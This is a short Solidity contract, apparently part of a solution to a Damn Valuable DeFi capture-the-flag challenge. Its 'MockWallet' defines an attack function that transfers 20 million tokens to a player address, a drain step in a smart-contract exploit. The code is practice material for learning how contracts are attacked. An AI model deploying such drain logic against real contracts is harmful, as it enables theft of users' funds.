//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";

contract MockWallet {
    function attack(address _token, address _player) public {
        DamnValuableToken(_token).transfer(_player, 20000000 ether);
    }
}
